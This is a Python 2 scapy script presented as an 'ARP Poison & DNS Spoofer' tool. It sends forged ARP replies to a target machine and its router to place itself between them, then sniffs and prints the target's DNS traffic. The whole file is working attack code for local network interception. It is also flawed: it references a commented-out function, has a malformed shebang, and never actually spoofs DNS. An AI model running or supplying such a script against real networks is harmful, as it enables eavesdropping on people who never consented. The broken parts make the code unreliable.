#!usr/bin/python
from scapy.all import *
import argparse
import threading
import time

#Set command line arguments for the program.
cmdParser = argparse.ArgumentParser(description="ARP Poison & DNS Spoofer Program")
cmdParser.add_argument('-t'
                    ,'--target'
                    ,dest='targetIP'
                    ,help='IP address of the target machine. Ex: -t 192.168.0.1'
                    ,required=True)
cmdParser.add_argument('-r'
                    ,'--router'
                    ,dest='routerIP'
                    ,help='IP address of the router. Ex: -r 192.168.0.100'
                    ,required=True)
args = cmdParser.parse_args()

def getMAC(ip):
    #Send and receive an ARP request and response for the specified IP.
    packet, errPacket = sr(ARP(pdst=ip), verbose=0)
    #Get the item in the second (after comma separation)
    for one, two in packet:
        return two[ARP].hwsrc

def arpPoison():
    routerMac = getMAC(args.routerIP)
    targetMac = getMAC(args.targetIP)
    print "Now ARP poisoning target machine: %s and router: %s ..." % (args.targetIP, args.routerIP)
    while True:
        #Resend the ARP response packets every 2 seconds
        time.sleep(2)
 		#Send packets to both target machine telling it we are the router as 
 		#well as sending to the router telling it we are the target machine.
 		#NOTE: IP Forwarding must be on for this!
        sendp((Ether(dst=targetMac)/ARP(op=2, hwdst=targetMac, pdst=args.targetIP, psrc=args.routerIP)),verbose=0)
        sendp(Ether(dst=routerMac)/ARP(op=2, hwdst=routerMac, pdst=args.routerIP, psrc=args.targetIP), verbose=0)

def dnsSniff():
    sniff(filter="udp and port 53", prn=packetExtract, stop_filter=packetCheck)

def packetExtract(packet):
    #Show all the DNS packets
    packet.show()

# def packetCheck(packet):
#     if Ether in packet[0] and ARP in packet[1]:
#         arp_sourceIP = packet[ARP].psrc
#         #If the packet is from the target machine, then ARP poison it.
#         if arp_sourceIP == args.targetIP:
#             return True
#     else:
#         return False

if __name__ == '__main__':
    #Executes ARP poison in a separate thread
    arpThread = threading.Thread(target=arpPoison)
    arpThread.start()
    #Spoof DNS traffic from target machine.
    dnsThread = threading.Thread(target=dnsSniff)
    dnsThread.start()
